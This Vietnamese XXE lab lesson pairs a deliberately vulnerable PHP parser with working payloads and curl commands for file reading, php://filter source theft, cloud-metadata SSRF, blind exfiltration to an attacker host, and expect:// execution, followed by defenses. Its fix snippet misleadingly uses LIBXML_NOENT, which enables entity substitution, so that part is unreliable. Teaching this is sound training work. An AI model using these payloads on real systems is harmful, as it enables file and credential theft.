# XXE — XML External Entity

> **Độ khó:** Medium — **Trình độ:** intermediate

## Giới thiệu

XML có khái niệm **ENTITY** — "biến/thực thể" bạn khai báo rồi dùng lại trong tài liệu. **XXE (XML External Entity)** xảy ra khi app **parse XML do user kiểm soát** mà cho phép entity tham chiếu **nguồn bên ngoài** (file trên server, URL). Kết quả: **đọc file nhạy cảm** (`/etc/passwd`, source), **SSRF** (gửi request tới nội bộ), thậm chí **RCE** với PHP `expect://`. Thuộc nhóm **A05 Security Misconfiguration**.

---

## Phần A — Hiểu (Understand)

### Entity trong XML

```xml
<!DOCTYPE foo [
  <!ENTITY name "value">
]>
<root>&name;</root>   <!-- chỗ này sẽ in "value" -->
```

Khai báo **external entity** bằng `SYSTEM` để tham chiếu file/URL:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>     <!-- sẽ chứa nội dung /etc/passwd -->
```

### Cách app dính lỗ hổng

```php
// LỖI CỐ Ý: parse XML với DTD/entity được bật
$xml = $_POST['xml'];
$data = simplexml_load_string($xml);   // PHP < 8: entity external vẫn chạy
echo (string)$data->name;
```

- Trước PHP 8, `libxml_disable_entity_loader` mặc định là `false` → external entity chạy.
- PHP 8 trở đi mặc định chặn. Nhưng nhiều app dùng **libxml2 C / Java / Python lxml** vẫn dễ bị XXE.

### Các payload XXE cơ bản

| Mục tiêu | Payload |
|----------|---------|
| Đọc file | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| Đọc file có ký tự đặc biệt | Dùng `php://filter/convert.base64-encode` |
| SSRF | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` |
| Blind XXE (exfil qua HTTP) | `<!ENTITY xxe SYSTEM "http://attacker/<?file...?>">` |
| RCE (PHP, cần bật) | `<!ENTITY xxe SYSTEM "expect://id">` |

> **Dễ hiểu:** App parse XML và "tin" mọi thứ trong đó. Bạn khai báo một entity trỏ ra ngoài (`SYSTEM "file://..."`). Khi app gặp `&xxe;`, nó tự động đọc file đó và chèn vào kết quả. App không biết nó đang làm giúp bạn điều đó.

---

## Phần B — Khai thác: Lab XXE

### Bước 1: Khởi động lab

```bash
cd xxe/lab
docker compose up -d

> 💡 **Lấy link lab:** Mở bài học này trên trang **Learning Detail** → bấm **"Truy cập Lab"** để hệ thống cấp link thực tế (VD: `https://vuln.ghedahaui.online/labs-env/...`). Thay `<LAB_ADDRESS>` bằng link đó trong các lệnh dưới đây.

# Lab tại: <LAB_ADDRESS>
```

Lab là API nhận XML (giống app lưu "product" hoặc "search") qua `POST /api/parse`, parse XML và trả về trường `name`.

<!-- ẢNH: Chụp trang lab XXE với form nhập XML (bước 1). File: xxe_01_form.png -->

### Bước 2: Gửi XML bình thường

```bash
$ curl -s <LAB_ADDRESS>/api/parse -X POST \
       -H "Content-Type: application/xml" \
       -d '<product><name>Laptop</name><price>999</price></product>'
{"name":"Laptop"}
```

<!-- ẢNH: Chụp parse XML bình thường trả về name (bước 2). File: xxe_02_normal.png -->

> **Giải thích:** App nhận XML, parse, lấy field `name` và trả về JSON. Vì app dùng XML → mục tiêu khả thi cho XXE.

### Bước 3: XXE đọc /etc/passwd

```bash
$ curl -s <LAB_ADDRESS>/api/parse -X POST \
       -H "Content-Type: application/xml" \
       -d '<?xml version="1.0"?>
           <!DOCTYPE product [
             <!ENTITY xxe SYSTEM "file:///etc/passwd">
           ]>
           <product><name>&xxe;</name></product>'
{"name":"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
..."}
```

<!-- ẢNH: Chụp XXE đọc /etc/passwd thành công (bước 3). File: xxe_03_etc_passwd.png -->

> **Giải thích:** `<!ENTITY xxe SYSTEM "file:///etc/passwd">` khai báo entity `xxe` trỏ tới file. Khi app parse và gặp `&xxe;`, nó thay bằng nội dung `/etc/passwd`. Lỗ hổng nằm ở chỗ app cho phép DTD/entity external mà không chặn.

### Bước 4: Đọc file có ký tự đặc biệt (php://filter)

```bash
$ curl -s <LAB_ADDRESS>/api/parse -X POST \
       -H "Content-Type: application/xml" \
       -d '<?xml version="1.0"?>
           <!DOCTYPE product [
             <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
           ]>
           <product><name>&xxe;</name></product>'
{"name":"PD9waHAgLy8gQVBJIHBhcnNl..."}
```

<!-- ẢNH: Chụp php://filter đọc source index.php dạng base64 (bước 4). File: xxe_04_php_filter.png -->

```bash
$ echo "PD9waHAgLy8gQVBJIHBhcnNl..." | base64 -d
```

> **Giải thích:** File PHP có ký tự `<`, `>` làm hỏng XML khi chèn thẳng. `php://filter/convert.base64-encode` mã hóa nội dung thành base64 (chuỗi an toàn) → bạn đọc được source mà không vỡ XML.

### Bước 5: SSRF — gọi metadata của cloud

```bash
$ curl -s <LAB_ADDRESS>/api/parse -X POST \
       -H "Content-Type: application/xml" \
       -d '<?xml version="1.0"?>
           <!DOCTYPE product [
             <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
           ]>
           <product><name>&xxe;</name></product>'
{"name":"<HTML>...</HTML>"}
```

<!-- ẢNH: Chụp SSRF gọi metadata service cloud (bước 5). File: xxe_05_ssrf.png -->

> **Giải thích:** `169.254.169.254` là **cloud metadata service** (chỉ truy cập từ nội bộ). Server của app bị lợi dụng làm "proxy" để gọi nó — đó là **SSRF**. Trong môi trường thật bạn có thể lấy được IAM credentials của instance.

### Bước 6: Đọc flag qua XXE

```bash
$ curl -s <LAB_ADDRESS>/api/parse -X POST \
       -H "Content-Type: application/xml" \
       -d '<?xml version="1.0"?>
           <!DOCTYPE product [
             <!ENTITY xxe SYSTEM "file:///flag.txt">
           ]>
           <product><name>&xxe;</name></product>'
{"name":"FLAG{xx3_3xt3rn4l_2026}"}
```

<!-- ẢNH: Chụp đọc /flag.txt qua XXE (bước 6). File: xxe_06_flag.png -->

> **Giải thích:** Giống bước 3 nhưng đọc `/flag.txt`. Đây là flag của lab. Lưu ý: nếu flag chứa ký tự XML đặc biệt (`<`...) thì phải dùng `php://filter` base64 như bước 4.

---

## Phần C — Phòng thủ & Checklist (Defend)

### Cách fix

1. **Vô hiệu DTD / external entity** ngay khi parse:

```php
// PHP 8+: libxml_disable_entity_loader đã bị xóa → dùng libxml options
libxml_use_internal_errors(true);
$options = LIBXML_NONET | LIBXML_NOENT;  // NOENT vẫn nạp entity nội bộ
// Chỉ dùng LIBXML_NONET (chặn network). Tốt hơn: chặn hẳn external entity.
```

```xml
<!-- Hoặc dùng thư viện parser không hỗ trợ DTD (VD: expat) -->
```

2. **Không parse XML nếu không cần** — dùng JSON.
3. **Không hiện lỗi parser** cho user.
4. **Validate input**: nếu chấp nhận XML, kiểm tra schema (không DTD).

### Checklist test nhanh

```text
[ ] Gửi entity file:///etc/passwd → thấy nội dung?
[ ] file:///flag.txt
[ ] php://filter/convert.base64-encode/resource=index.php
[ ] SSRF: http://127.0.0.1:PORT, http://169.254.169.254/...
[ ] Blind XXE: DTD ngoài (external DTD) gửi dữ liệu về attacker server
[ ] Thử các content-type: application/xml, text/xml, application/x-xml
[ ] Test ở cả GET (nếu app parse query) và POST
```

---

